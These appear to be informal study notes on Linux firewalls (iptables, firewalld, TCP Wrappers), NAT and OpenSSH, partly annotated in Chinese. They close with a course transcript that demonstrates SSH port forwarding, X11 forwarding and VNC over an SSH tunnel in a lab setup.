Once the initial handshake is complete and allowed through the
firewall, all subsequent communication via that connection will be allowed, until the connection is finally terminated.
  Handling TCP connections is relatively straightforward because both parties must perform an initial handshake to set up the connection. Handling UDP traffic is not as clear. Most stateful firewalls consider a UDP “session” (an abstraction that is not reflected in the underlying protocol) to be started when a legitimate UDP packet is allowed through the firewall. At this point, all subsequent UDP transmissions between the same two IPs and ports are allowed, until a specified timeout is reached.
Stateful firewalls allow administrators to apply more restrictive rules to network traffic and create more effective policies for inbound versus ▪


## outbound traffic. However, sometimes it is desirable to be able to man- age traffic based on the actual contents of packets entering and exiting a network rather than merely considering the origin and destination. This is possible through the use of application-layer firewalls. As the name indicates, these firewalls are capable of examining the data stored at the application layer of inbound and outbound packets, and apply rules based on these contents. example, simple rules might reject all requests for a particular web site. Most modern firewalls employ some level of higher- layer filtering, which depends on the properties of an IP packet’s payload, such as the properties of the headers of TCP and UDP packets. In general, the practice of examining higher-layer data in network traffic is known as deep packet inspection. It is frequently used in conjunction with intrusion detection systems and intrusion prevention systems to make sophisticated policies delineating acceptable and potentially malicious traffic.
Host-based firewalls (sometimes called application-based) filter traffic in and out of individual hosts.
Some Linux systems use iptables or xtables for firewall capabilities.
Hoset-based firewall
Link to coffe shop wifi, prevent other patron of the coffe shop trying to accee his laptop.
Host-Based Firewalls
 monitors traffic going in / out of a single host (server or a workstation).
It monitors traffic passing through the NIC
can prevent intrusions into the computer via the NIC.
Many operating systems include software-based firewalls used as host- based firewalls.
  - example, Microsoft has included a host-based firewall on operating systems since Windows XP.
  - many third-party host-based firewalls are available.
  - host-based Windows Firewall on Windows 10:
 ⁃
  - can configure inbound rules to allow or restrict inbound traffic
and outbound rules to allow or restrict outbound traffic.
  - The connection security rules provide additional capabilities, such as configuring an IPsec connection in Tunnel or Transport mode to encrypt the traffic.
Linux systems support iptables and many additions to iptables, such as ipv6tables, arptables, and so on. Generically, administrators commonly refer to these as xtables.
You can configure rules within different tables. Combined, these rules work just like an ACL.
Personal firewalls provide valuable protection for systems against unwanted intrusions. overall defense-in-depth strategy.
It’s especially important to use personal firewalls when accessing the Internet in a public place. (Free Wi-Fi Internet access). without the personal firewall enabled is risky, never recommended.
Application-Based
typically software running on a system.
Example
host-based firewalls are commonly application-based.
network-based firewall is usually a dedicated system with additional software
installed to monitor, filter, and log traffic.
example, Cisco makes a variety of different network-based firewalls. Many of them
are dedicated servers with proprietary firewall software installed.
Network-Based Firewalls
would have two or more network interface cards (NICs) and all traffic passes through the firewall.
The firewall controls traffic going in and out of a network.
  - It does this by filtering traffic based on firewall rules
  - allows only authorized traffic to pass through it.
Most organizations include at least one network-based firewall at the border, between their intranet (or internal network) and the Internet.
Web Application Firewall (WAF)
Firewall specifically designed to protect a web application, which is commonly hosted on a web server. ▪


## typically placed in the demilitarized zone (DMZ)
will alert administrators of suspicious events.
It can be a stand-alone appliance, or software added to another device.
Example:
an organization may host an e-commerce web site to generate revenue.
The web server will be placed within a demilitarized zone (DMZ), but due to the data that the web server handles, it needs more protection.
A successful attack may be able to take the web server down, and allow an attacker to access or manipulate data.
Note that you wouldn’t use a WAF in place of a network-based firewall.
Instead, it provides an added layer of protection for the web application in addition to a network-based firewall.
circuit-level gateway 电路级防火墙 a type of firewall.
work at the session layer of the OSI model,
  - or as a "shim-layer" between the application layer and the
transport layer of the TCP/IP stack.
They monitor TCP handshaking between packets to
determine whether a requested session is legitimate.
Information passed to a remote computer through a circuit-
level gateway appears to have originated from the gateway. Firewall technology supervises TCP handshaking among packets to confirm a session is genuine.
Firewall traffic is cleaned based on particular session rules and may be controlled to acknowledged computers only.
     ▪


##  Circuit-level firewalls conceal the details of the protected
network from the external traffic, which is helpful for interdicting access to impostors.
But circuit-level firewalls do not clean entity packets.
Circuit-level gateways are relatively inexpensive and have the advantage of hiding information about the private network they protect. On the other hand, they do not filter individual packets.
该防火墙被描述为第二代防火墙。 其主要功能是作为TCP的中继，故因为工作机制类似中
继，可能才被命名为Circuit-level。
该防火墙主动截获TCP与被保护主机间的连接，并代表 主机完成握手工作。当握手完成后，该防火墙负责检查只有属于该 连接的数据分组才可以通过，而不属于该连接的则被拒绝。由于其 只检查数据包是否属于该会话，而不验证数据包内容，所以其处理 速率也是较快的。
Securing Hosts and Services - iptables and TCP Wrappers
Firewalls
- device that filters network traffic based on a set of rules.
- allows things in if they're permitted, and it also prevents things from
entering if they're not permitted.
- Filtering and firewalls can be very complex and sophisticated,
◦ but in its simplest, common form, one filters traffic based on information inside the packet. like Source / Destination IP, or
Source / Destination Port, as part of your filtering policies.
   ▪


## - host-based security and network-based security.
◦ Firewalls can be implemented in either of these strategies.
defensive depth strategy, firewalls should be implemented in both developing security architecture.
◦ host-based firewall, filters traffic destined for that machine. service provided by the os, or software installed on os.
◦ network-based firewall, filters packets that are passing through that machine.
often see firewalls on the perimeter of networks, securing
the hosts that are on that network.
- configure Linux systems to perform both functions, both network-
based and host-based firewalls.
◦ iptables. can configure both iptables and firewalld-based
systems as either host-based firewalls or network-based
firewalls.
◦ setting up iptables in host-based configurations
◦ network-based firewall with iptables if we were using our Linux system as a network router or a firewall.
case as Server 0, which is the network router and firewall for our lab environment.
set it up as a network-based firewall. enabled firewalld to
route between both segments between Server 1 and Server 2, but also to route and masquerade and NAT our traffic out to the internet.
It's providing network routing, network-based firewall functionality to our lab.
Linux Firewall Architecture
overall firewall architecture available into CentOS-based systems.
- core is netfilter,
◦ a kernel-based framework for packet filtering, filtering packets based on our defined policies.
     - interact with netfilter via the iptables commands.
◦ add or remove rules and implement our traffic policies here.
◦ Netfilter provides the hooks into the kernel; iptables allows us
to manage how netfilter works.
- iptables service has been replaced with firewalld.
◦ Firewalld still interacts with iptables, executing iptables commands under the hood.
◦ Firewalld allows to build more complex filtering policies with concepts like zones and services,
◦ primary advantage: it doesn't require a complete flushing of the rules when we want to apply a new ruleset in iptables.
 netfilter - Terminology and Tables and Chains
each table has chains, each chain has rules, each rule has a match, and
each match has a target.
- if your packet doesn't match any of these, it go to the default rule.
- The default rule is defined at the table level
◦ can be either accept or drop, depending on configure
◦ The default is to accept, risk.
Now, as packets pass through the tables and chains, and onto the rules,
that rules are processed from the top down. And this impacts your ▪


## security policy, and how you implement things in iptables.
- table: a collection of chains
◦ each table is based on a purpose.
◦ based on what we're trying to achieve with the rules that we've
defined in that table's chains.
◦ three tables on our system by default: filter, NAT, and mangle
- chain:
◦ evaluation points as packets flow through our system.
◦ And on each chain, or evaluation point, we define a collection of rules.
◦ Chains determine at what time in a packet's flow through your system its rules are evaluated.
prerouting chain. This chain is evaluated before the routing decision is made.
input chain. This chain is evaluated for packets delivered to local processes on our systems.
forward chain. This: packets that are being routed through our system.
output chain. This is evaluated as packets are leaving local processes on our system.
postrouting chain. This is evaluated after the routing decision has been made.
On a chain, define rules. And rules are defined by matches and targets.
- rule: a collection of policies based on match criteria.
◦ rules are processed from the top down.
◦ If no match, packets will be caught by the default rule, and
sent to the default target.
- match criteria: the packets, pass the traffic on to target.
◦ A match describes the traffic that interested in, so its source
IP, destination port, things like that.
- target is what we're going to do with it: accept, reject, drop, or log.
◦ Accept: allows the packet through. 2,656

◦ Reject: reject the packet, and reply back to the sender that that traffic was prohibited.
◦ Drop: take the packet and drop it.
◦ log: can be combined with any other of the targets here, and
log the traffic.
use the state of the connection to help us build more granular rules. The most common ones that are used are new, established, and related.
- New: any new connection coming in.
- Established: any connection in which packets have already been
seen in both directions. Think of connections that have already
completed the TCP three-way handshake.
- related: a new connection built up, but associated with an existing
connection.
◦ example
◦ the FTP data transfer channel, opened after the control channel is connected.
Default Tables and Their Chains
the filter table:
- to evaluate traffic coming into, passing through, or leaving our system.
- On the filter table, 3 chains: input, forward, and output.
- doing basic filtering, the logic behind which chains are on this table
makes sense.
  - the input chain is evaluated when the packet is received and
on its way to a local process on our system.
  - output chain is evaluated for packets originating from
processes on our system,
  - forward chain is evaluated for packets being routed through
our system.
- So at these three chains, or evaluation points, we can apply filters for
traffic coming into, passing through, or leaving our system. - iptables will use the filter table by default. the NAT table
- It's chains are prerouting, output, and postrouting.
- modifying the IP information in the header of the packet:
  - If traffic is passing through our system, we could perform this IP translation, or altering of IP information, before the routing decision is made, using the prerouting chain.
  - do that after the routing decision is made, use the postrouting chain.
  - if traffic is being generated on our system, to modify that IP information, use the output chain.
the mangle table.
- to alter the IP header. This table is able to do that anyplace in the packet's flow through our system.
  - Chains on the mangle table:
  - prerouting, input, forward, output, and postrouting.
- Basically, anywhere as the packet flows through our system.
Iptables commands
 interact with netfilter using iptable s. ▪


##   TCP Wrappers
host-based access controls
 ▪


##  filtering connections to network services that are compiled with the TCP Wrapper library.
  - filter on things like IPs, ranges of IPs, and DNS names. One other key features: logging.
  - primary function is to secure things at the service level
  - Not at the network level, as traffic is already past the
firewall into the host process it's destined for.
  - For example
  - configure TCP Wrappers around SSH service to provide an additional layer of security for that service.
  - like limit the IPs that can connect to SSH,
  - add additional logging as well.
to configure TCP Wrappers, two files: hosts. allow, and hosts. deny.
  - hosts. Allow:
  - to allow access to the TCP-wrapped service.
  - scanned sequentially, if a matching rule, the connection is allowed.
  - If there's no match, we move to the hosts. deny file.
  - hosts. deny:
  - scanned sequentially, if a match, the connection is denied.
  - If there's no match in either of the files, access is allowed.
 ▪


##   - key thing: order matters, between the files and inside the files.
  - if allow access in hosts. allow, and deny in hosts. deny
  - the connection is still allowed.
  - The first match in a file wins, and processing is terminated.
  - if there is no entry in any of the files, the connection is allowed.
no service to restart.
  - Configuration changes are immediately available in the hosts. allow or the hosts. deny file.
inside of hosts. allow or hosts. deny.
   ⁃
hosts. allow
  - SSH daemon, sshd, allow SSH connections to all hosts in the psdemo. local domain.
 ▪


##  hosts. deny
  - denying all connections from the individual server this time, badserver. hackerz. local.
⁃
Firewalld
a service or Daemon honor system
provides a dynamically managed firewall.
killer feature is support for zones.
  - ability to define a trust level for network connections or
interfaces, and apply policies to these interfaces.
  - This allows for more consistency and ease of configuration for your system.
      - ▪


##  over iptables
  - build higher level abstractions that you can reuse easily in your configuration
  - zones already
  - the ability to group other types of configurations together, like services based on their ports and protocols
  - restart firewalld, or make configurations changes, it doesn't interrupt existing connections like iptables can.
  - uses XML based configurations files. allows firewalld to build these higher level constructs and reuse them because they're going to be defined in their own configurations files.
Now under the hood
  - firewalld still implements its configuration in iptables, but that's hidden from you if you want.
  - owever, we do have the ability to work with iptables directly if need to.
  - But we still need to do that through our firewalld commands: direct interface.
permanent configuration and running configuration.
  - The permanent configuration is the one that the system will load if the system is restarted, or if the firewall service is reloaded.
  - The running configuration is the active configuration, which is anything that could have changed since the loading of the permanent configuration.
  - Change something at the command line after the
 ▪


## Default Zone
permanent config loaded, and not yet committed to the permanent configuration.
 pre-configured zones
public zone
  - default for all network interfaces on a CentOS based system.
  - do not trust any other computers on your network.
  - 拒绝进入的流量，除非与出去的流量相关;而如果流量 与ssh、dhcpv6-client服务相关，则允许进入
block zone
  - block any incoming network connections so that only machines on the same zone can initiate new connections.
  - 拒绝进入的流量，除非与出去的流量相关 drop zone
  - similar to block, but no reply is sent when rejecting a packet.
  - It simply drops the request.
  - 拒绝进入的流量，除非与出去的流量相关 The dmz
  - systems in a perimeter network that have services that it needs to be partially available. like web servers on a screened subnet.
   ▪


##   - 拒绝进入的流量，除非与出去的流量相关;而如果流量 与ssh服务相关，则允许进入
external zone
  - which is used on the external interface of a router-based configuration. This is useful in masquerading scenarios.
  - 拒绝进入的流量，除非与出去的流量相关;而如果流量 与ssh服务相关，则允许进入
  three
zones that are very similar, home, internal and work.
  - for mostly trusted networks with selected incoming connections accepted, each variation being slightly different than the other for home, internal and work.
  - home: 拒绝进入的流量，除非与出去的流量相关;而如果 流量与ssh、mdns、ipp-client、amba-client与dhcpv6- client服务相关，则允许进入
  - Internal: like home
  - Work: 拒绝进入的流量，除非与出去的流量相关;而如果 流量与ssh、ipp-client与dhcpv6-client服务相关，则允 许进入
trusted zone.
  - 允许所有的数据包进出
  - All network connections are accepted.
   参数
--get-default-zone
--get-zones --get-services
作用
查访默认的区域名称
显示可用的区域
显示预定义的服务
         --set-default-zone=<区域名 称>
    设置默认的区域，使其永久生效
         --get-active-zones
  显示当前正在使用的区域、来源地
址和网卡名称
    --add-source=
  将源自此IP或子网的流量导向指定 的区域
    --remove-source=
  不再将源自此IP或子网的流量导向 这个区域
    --add-interface=<网卡名称>
  将源自该网卡的所有流量都导向某
个指定区域
    --change-interface=<网卡名 称>
  将某个网卡与区域进行关联
    --list-all
  显示当前区域的网卡配置参数、资
源、端口以及服务等信息
     --list-all-zones
    显示所有区域的网卡配置参数、资
源、端口以及服务等信息
 --add-service=<服务名> --add-port=<端口号/协议>
设置默认区域允许该服务的流量
设置默认区域允许该端口的流量
     ▪


##    --remove-service=<服务名>
  设置默认区域不再允许该服务的流
量
    --remove-port=<端口号/协 议>
  设置默认区域不再允许该端口的流
量
     --reload
    让“永久生效”的配置规则立即生 效，并覆盖当前的配置规则
 --panic-on 开启应急状况模式 --panic-off 关闭应急状况模式
Network Address Translation NAT.
allows to change the IP address of either the source or the
destination IP in the IP header, and track those connections to maintain persistency.
Using that, we can expose one host or many hosts, or even a
network of computers to the internet or to another network via a single address or even many addresses.
When configuring that, what you're doing is you're exposing your
private network to another network, and this is usually going to be the internet. Sometimes we can use NAT to help us overcome overlapping IP address schemes between separate networks, and using that, we can leverage that to make the address translations so that each network can communicate to each other, a very effective technique there.
         ▪


##  Now, let's walk through three very common NAT implementations.
port forwarding. Let's look at these each in a little more detail. The
first example of NAT that we're going to look at today is one to one. Using this, we can
One to one
   ⁃
  - expose a privately addressed host on our network to another network, most often the public internet. Once a system is NAT'd out, the external host will be able to communicate to that system using the translated IP address.
  - packets sent to this IP on the external network or on the internet will be routed to firewall, the firewall will re-write the IP header, placing the private address back into the IP header, and sending that traffic to server two's private IP address.
one to many, masquerading
 ▪


##  ⁃
  - a network of computers that is privately addressed is translated to one IP to its external network.
  - And it's most commonly used to give a network of computer access to the internet.
  - any connections leaving this network from any of these hosts will look like the IP 200. 100. 100. 1, and replies coming back will be destined to that IP address.
  - firewall that's functioning and doing the masquerading will ensure that the traffic gets back to the originating hosts.
  - This technique is crucial to the conservation of public IP addresses on the internet, as we can represent a whole network of computers with just one IP.
  - Now, there are some edge cases under high load situations where this might be a scalability issue. But those are pretty rare cases. And if that's the case, then we can simply add an additional IP and start overloading again on that address.
Port forwarding
 ▪


##  ⁃
  - the perimeter firewall or device accepts the connection on a particular port and routes only that port's traffic to another host or even to another port.
  - commonly used when we have something like port 80 being exposed on the internet via the perimeter device, but the web service behind it is actually running on an internal web server.
remote access concepts
to access our systems from a less secure remote networks. goals.
  - provide authorized access to the systems, know who's coming into the system is who they say they are,
  - protect information. Information traveling across less secure networks is potentially exposed to interception by an unauthorized person
Linux world one of the most common ways to provide remote access to systems and networks is OpenSSH.
   ▪


##   - encrypt information traveling between client and server,
  - and authenticate the user attempting to log in.
OpenSSH
OpenSSH encrypts information between clients and servers.
provide encrypted terminal sessions/ shell connections to our servers.
  - interact with systems via the command line interface remotely and securely.
use it for a single remote command execution.
  - not to open a terminal session up to a remote system, and just
execute a single command,
  - very useful for automation tasks across many systems.
securely exchange files between systems with secure file copy. tunnel an arbitrary TCP-based service inside of an OpenSSH
connection,
  - meaning if I have a service on a remote system and we want to ensure that the data between our two systems is encrypted when we communicate with it, we can do that with an SSH tunnel, or perhaps a fire wall between the client and server doesn't permit access to that application's destination port, but we can access that remote system via SSH.
Encryption:
encodes messages in a way to guarantee that the message being transmitted between systems is not readable by unauthorized
     ▪


## observers.
hide our information from interception or observation by a third party during its transmission.
symmetric encryption - shared secret key
  - primary reason to use symmetric encryption is performance and security.
  - If a shared secret is actually secret symmetric encryption is extremely secure.
Asymmetric - pair of keys
SSH uses both of these techniques to secure connection.
  - When first open up a SSH connection between a client and a
server, it does key exchange.
  - SSH uses asymmetric encryption to build a connection so that
it can exchange a shared secret key.
  - Once that exchange occurs the connection transitions to symmetric encryption using that new shared secret key, and uses an encryption protocol of the client's choice.
  - Once the key is exchanged, the connection moves to user authentication phase
Authentication
authenticating users in OpenSSH we have several choices
GSSAPI, generic security service, application, program and
     ▪


## interface, Kerberos.
  - Kerberos: it authenticates both the client and the server's
services with Kerberos tickets. host-based information.
  - This authenticates other hosts that need to communicate with our SSH server giving them the ability to log in.
public key
  - uses a key pair to authenticate a user,
  - can use this method to log into systems via SSH without a password if our keys don't have passwords. But if we really want to double up our security we can use both the key and a password if desired.
  - the keys distributed to the remote system
  - SSH client: generate an asymmetric key pair, store both
keys on local system
  - ssh-keygen
  - copy only the public key to the remote system
  - ~/.ssh/authorized_key
      - ▪


## S
  - authentication
  - the client connects to the server, it sends over its key ID
to the remote server.
  - server looks up that client's public key in the authorization file with that key ID. The remote system generates a random number, encrypts it with the public key of the client and sends that value back to the client.
  - client has the private key, decrypt that message and extracts that number out of the message. uses a pre- negotiated session ID, combined with the number, and generates a hash value. That hash value is now transmitted back to the server.
  - The server does the same hash operation on its copies of those values and compares that with the hash that it just received from the client.
  - If the hashes match then the user gets to log in.
challenge response / keyword interactive
  - use this in combination with passwords,
  - the pluggable authentication modules are Pam and also token- based methods like secure ID.
finally, password
It's encouraged to use public key authentication.
OpenSSH Package
   ▪


##  OpenSSH is usually installed by default on Moke's Linux systems.
But I wanted to take a second to call out the packages used in OpenSSH on CentOS.
OpenSSH package, which is actually just a core set of files used by both the client and server packages, mostly just the libraries to run
both programs.
OpenSSH client package. This is the client components and user
line programs of our OpenSSH package, so the actual SSH command that we type when we're functioning as a client, and also some other programs and binaries that we'll look at in an upcoming module.
OpenSSH server package which is naturally the server side components and programs that function as our OpenSSH daemon.
OpenSSH allows us to store our configuration information in two places.
  - Client:
  - First up is a system-wide client configuration file, and that lives in
  - etc/ssh/ssh_config
  - each individual user has a configuration file in their home
directory
  - ~/.ssh/config
  - configure various parameters and options about your SSH client connection.
  - server side
  - a system-wide configuration file: etc/ssh/sshd_config.
   ▪


##   - things may need to change: which port SSH listens on, which IP it listens on, also allow users and IPs is configurable inside this file, logging and authentication methods.
SSH Tunneling
a client runs SSH, and want to connect to a computer in data center that runs a service
but there's a firewall in the way preventing access to that service,
however, that firewall does allow SSH to pass through it.
  - can use SSH to build a tunnel from client to the server.
    ⁃
port forwarding scenario isn't limited to just sending traffic to that
one host on the remote network, can actually use SSH to relay connections to other hosts on that internal remote network, remote port forwarding.
  - the traffic passing through the tunnel can be relayed to a host on that remote network where the SSH connection is
 ▪


## terminating.
Remote Desktops: X11 and VNC So we're all command line folks here, right? But every once in a while you need to run a graphical console to accomplish a task.
Under the hood of the graphical systems on Linux machines is X11,
X11 is a window management system that most graphical desktop managers are build on top of. Now what's really cool is we can leverage SSH to forward the graphical display of a remote computer onto our local desktop, this is really neat stuff if you think about it. We can build an SSH tunnel, we can execute a graphical command on a remote session, and the display of that command:warded to our local machine, and the task is actually executed on the remote computer, which I have always thought was super cool.
VNC, virtual network computing.
  - an application that we install, and gives us a remote graphical desktop to our system.
  - It's most often combined with SSH tunneling to allow secure encrypted graphical connections to remote systems.
Demo: SSH Tunnels and VNC Installation and Setup Alright, so here we are in a demo, and we're going to look at configuring SSH tunnels for an arbitrary service, and we're also going to look at how to use X11 forwarding, and also installing VNC and connecting to VNC over an SSH tunnel. Alright, so here we are on server1 with an SSH session open to both server1 and server2. Now we're going to start off by tunneling an arbitrary service, and we need an arbitrary service to tunnel, so I'm going to install Apache on server2, but I'm going to leave the firewall blocking such that for server1 to be able to reach server2, we have to configure an SSH tunnel. So let's go ahead and switch over to server2, and begin by installing Apache. So we get to sudo yum install httpd, I'll throw a -y on
 there so that gets in there automatically for us when it gets to the end of the yum download. So with Apache installed, let's go ahead and use systemd to start up our http daemon. Sudo systemctl start httpd, just going to press enter, and we'll check the status of our daemon before we get too far, and there we can see it's up and running and active. Now I'm going to switch over to superuser for a second, with sudo su and then a minus sign, and I want to add a document inside of var/www/html such that we kind of know very easily which server we're working with, and to do that, real easy, I'm going to say echo, say 'hello from server2' redirect that into var/www/html, and I'll put that in at index. html. Just going to press enter, confirm the contents of that file, so we're not chasing our tail too much later, html/index. htm, hello from server2, excellent. So just to prove to you that I have nothing up my sleeve, I'm going to show you the firewall commands to show to you that http is not an allowed service on this system. So we'll use firewall-cmd, we're going to do get active zones, you can see I'm in the public zone, and my interfaces on that zone is the only interface on this server, which is enp0s3, and so let's use firewadll- cmd to look at that zone configuration, so we can say firewall-cmd -- zone=public and we'll do a list-all. So here we can see the only services allowed into this system on server2 are dhcpv6-client, and SSH, http is certainly not open. So now let's go ahead and switch over to server1 and build up our SSH tunnel. So here we are on server1, and I'm going to use a program called curl, which is simply a command line web browser, and I'm going to curl http://server2. psdemo. local, and you can see it says failed connect. That no route to host error is a little misleading, we have a route to the host certainly, but it's failing to connect to port 80 to download that index. html file, which is our default document. So let's go ahead and build up our SSH tunnel together, and we can do that with ssh -L, and the port I'm going to connect to locally, I'm going to use port 8080, and then I'll throw in server2. psdemo. local, and the remote port on server2 that I'm going to connect to is port 80, and again server2. psdemo. local. Let's go ahead and press enter, and you can see here it's asking me for the passphrase to my key, so if you set up public key authentication like we did in a previous demo, use that pass phrase, if you didn't do that demo, simply enter in your password for server2, so let's go ahead and enter in that pass phrase and now you can see I have a shell session to the remote server. So even though I told it to build a tunnel, it still built a shell session to the remote system. We're going to look at an
 example later where we can get around that, but right now, just know that with no options you'll get a shell session, so I'm going to need a new terminal here, so again from terminal I opened up a new terminal and on server1, now if I type curl, but this time I'm not going to point my web browser at server2, I'm going to point it at localhost:8080, right, that's that local port that I'm going to make my request into, it's going to shoot across the tunnel over SSH, and it's going to pop out the remote side on port 80. So here what I should see is hello from server2, right, so it downloaded that document, and curl presented to me the contents of that document via the command line. Now if we wanted to configure remote port forwarding, we simply can go into ssh/sshd_config type in our password, and I'm going to look for something called gateway ports. So here you can see gateway ports, by default it's configured to no, because clearly we wouldn't want to route ports through systems, right, without really knowing that that's going on. If we wanted to configure this, we'd simply uncomment this out, and change that to yes. But I really don't want that, so I'm going to quit without saving this file. Alright, so let's go ahead and clean up some of these terminals here and exit out and leave us with just a connection open to server1. So here we are just on server1, now I'm going to show you how X11 forwarding works, and to do X11 forwarding, I'm going to open a session up to server2, and so I'm going to say ssh -X demo@server2. psdemo. local, just going to press enter, throw in our pass phrase, and now it's going to start forwarding X11 requests from the server back to my client, but I don't have any X programs running yet, so let's go ahead and install some X programs on our remote system. So here on server2, I'm going to type sudo yum install and I'm going to install xorg-x11-apps and I'll throw a -y on there. Let's go ahead and give it our sudo password. And kind of the ubiquitous way to show if X forwarding is working is to use the program called xeyes, so I type in xeyes, and there you can see in the upper left hand corner of my screen is the program xeyes. So let's go ahead and close that, and this is an example of X11 forwarding, so that program, the X11 program, was executing on server2, but its display is being forwarded here to server1. Alright, so after the X11 demo, let's go ahead and exit out of server2, get back on server1, and clear our console. And open up a second window, and let's go ahead and ssh over into server2 again, so we have two windows side by side. And so there we have a server2 window, and a server1 window. So back over on server2, we're going to now go and set up VNC, right, and so we're going to configure a VNC server on server2, and we're going to connect to that from the VNC client on server1. And again, we're going to do this over an SSH tunnel, which is the most common way to do this, right, we really don't want to have VNC wide open on the internet for people to connect to. So on server2, let's go ahead and start off with sudo yum install tigervnc-server again we'll throw a -y on the end, give it our password, and once VNC's installed, we have a couple steps that we have to do to go ahead and get it set up, so bear with me here while I walk through these steps. And the first thing that we need to do is sudo, and we're going to copy a file from usr/lib/systemd/system and we're going to look for a file called vncserver@. service and we're going to take that file and we're going to copy it into /etc/systemd/system/. And let's go ahead and open that file up with a text editor. So let's open up systemd/system/ and that's going to be vncserver@. service. Now once this is open up, page down a little bit, and it's going to be pretty obvious what we need to change. The two things that we need to change, right off the bat, are we run VNC as an individual user because what's going to happen is we're going to start up this VNC service, and it needs to start a desktop as somebody, and in this case, it's going to be our user demo. Now underneath here, we need to also tell the PIDFile where it's going to reside, and that's going to be in our home directory, so we're going to go ahead and do /home/demo. Now the window that I'm executing in right now is kind of low resolution, so that I can pick up a good quality for you guys in a video so by default, I believe the geometry for the resolution of a VNC session is bigger than the resolution that I have right now. So for you guys, I'm going to add geometry, and then a space, and I'm just going to say 800x600. So I'm kind of clamping down that resolution so when we do this later, it just doesn't run off the screen. So you can set this resolution to whatever you guys like, so let's go ahead and save this file out with a right and a quit, and we're back at a command prompt. So since we did make it edit to a systemd unit, we need to tell systemd about that, and so we can do that with a sudo systemctl and that's going to be a daemon-reload. Let's go ahead and press enter, and it's going to reread that configuration file. Now again, this is all happening on server2, right, so we also need to add a VNC password for our VNC session, so it's another thing that VNC needs when you connect to it. So when we come over on server1, and we do make a connection attempt to server2, it will still challenge us for a password, and it's going to be its own password, it's going to be a VNC password, right, just what you needed, another password. So we say vncpasswd, and you press enter, and let's go ahead and type in a password. And there you go. So back at the command prompt, all that's left to do on server2 for the service startup of VNC is to start up the service, and it can do that with a sudo systemctl start and it's going to be a vncserver and this is where the syntax gets a little weird, where it's going to be an at sign, then a colon, the number 1, and then the unit type dot service. And so what we're doing here is we're telling vncserver to start up a console on this first interface, or colon 1, right, and then the dot is just simply the service type. So let's go ahead and press enter and cross our fingers. Alright, so if you see this error here where it says resource limit exceeded, let me show you how to fix this up and it's actually a bug in the later releases of CentOS, and I think around late December of 2016 this got resolved, but let's go ahead and show you how to clean this up. So if we switch over into the temp directory, if we do an ls -la, you can see there's some xfiles laying around. So let's go ahead and remove those, so we do a sudo rm and I'm going to remove X0. lock, then I'm going to remove X2. lock, and I'm also going to remove that. X11 directory. And we'll have to throw a -rf on there to get rid of the condense. Alright, let's go back out here, now what's interesting is, and I'll show you guys, is that VNC actually started, right, we can see our VNC process there. The error that we got when we started the VNC service was actually a false positive, because you can see clearly with the syntax here that XVNC is running, server2. psdemo. local and it's on the geometry 800x600, right, so it read our configuration, so I'm going to go ahead and kill that one, 12505, and I'm going to start my service again. And this time we shouldn't get an error, and we don't. So now we know that our service for VNC server is up and running, we can confirm that with status, so systemctl status, and we can see it's active and running. Now another way that we can confirm that VNC is up and running is we could check to see if it's listening on its TCP port, and we can use the command ss and we use -lt4 to list all of our listening sockets on this computer, and you can see right there at the top is *:5901. And just so you know there's nothing up my sleeve, when we did the demo earlier, when I showed you the firewall configuration for http, the only things that were open on this firewall were dhttpv6-client and ssh, so we know that 5901 is not an available service on server2 here.
Demo: Connecting to VNC Over and SSH Tunnel So before we jump over to server1 for testing, I'm going to disable the firewall cause I want to show you guys how VNC works without tunneling, and then we'll come back and do it with tunneling. So VNC server's all up and running, let's go ahead and do sudo systemctl stop firewalld not a good thing to do on a production system, but this is just a demonstration. So let's jump over to server1 and get our VNC client installed. And we can do that with sudo yum install tigervnc. The other package that we installed on server2 was tigervnc-server, this is just tigervnc, which is just the client. Let's go ahead and give it our sudo password, it's going to bring down that package for installation. So now on the client side, I'm going to go ahead and use the VNC viewer to connect to the remote desktop on the un-firewalled port 5901. And we do that with the program vncviewer, and then it's going to be a parameter of our server name, psdemo. local, and now remember when we starred at that :1 on the service unit on server2, this is where that comes into play, so I put :1 right here because that's the VNC service that it's going to connect to. We can run multiple servers, and multiple graphical desktops on server2, but this is a way to uniquely identify those. And on the remote side, when we saw 5901, the ports increase as well as the number of the vnc service increases. So let's go ahead and press enter. And now we're presented with a password for authentication, and this is going to be the vnc password that we entered on server2, so just going to enter that, and press enter, let's enter it one more time, for our GNOME session, and there you go, you can see we now have a graphical desktop over to server2, see demo@server2. So let's go ahead and close this cause we're certainly never going to do it this way. We're going to go back over to server2, and we're going to start our firewall, and we're going to use SSH tunneling to make a connection to this port. So back over on server1, earlier when I showed you SSH tunneling, it gave me a shell. This time I'm going to show you the syntax such that it won't create a shell, and you can background the SSH tunneling process. So ssh -L for our local port, I'm going to use our local port as 5901 just so that it matches, and it's pretty easy to remember, server2. psdemo. local, that's going to go to the remote port, which is also 5901, on server2. psdemo. local, throw a -N on the end. Now what this is going to do is not open a session, or terminal session, to the remote server, it's just going to create the tunnel for me. So here is the request for my pass phrase, so now that's up and running, right. So I can use the bash shortcut control-z to stop that process and use bg to background that tunnel, so that tunnel's up and running now, it's just a backgrounded task, and I still have a session open to server1 rather than a session open to server2, which I did in that previous demo. So now I can type vncviewer again, but this time I'm not going to use server2. psdemo. local, I'm going to use localhost, and the local port is going to be 5901, so let's go ahead and press enter, and there you can see I'm challenged for my password again, and I get immediately back into the session that I had on my VNC server, because before when I had logged in to VNC to highlight that it was server2, I opened up the terminal, and you guys saw that. So this is a persistent, right, so I can come in and out of this VNC session as needed. Now the critical thing here is this is a great remote access method if your tunneling is over SSH, so you want to make sure that you keep these things secure and encrypted.
Module Overview and Course Wrap Up! Well here we are at the end of the module, and we've covered several SSH programs and how to use them, specifically how to move or copy files with SCP. We also learned how we can leverage SSH for remote command execution, and some basics on how to build tunnels between systems for secure access. We also learned how to get graphical consoles on remote systems with both X11 and VNC. So here we are at the end of the course, I hope you enjoyed listening to this, and that we've laid the appropriate foundation for your LFCE studies. We've covered a lot of ground so far together, we've covered Linux security and architectures, we dove deep into firewalling with IP tables in firewalld, and we also learned how to access our systems remotely with SSH, and some very cool tools and techniques. It's truly been a pleasure recording this course for you. I thank you for listening and, most importantly, learning with me, I hope you enjoyed the course, and join me again here soon, again at Pluralsight.
. 6.3 Tunneling
As we have mentioned, one of the challenges of Internet communication is that it is not secure by default.
The contents of TCP packets are not normally encrypted, so if someone is eavesdropping on a TCP connection, he can often see the complete contents of the payloads in this session.
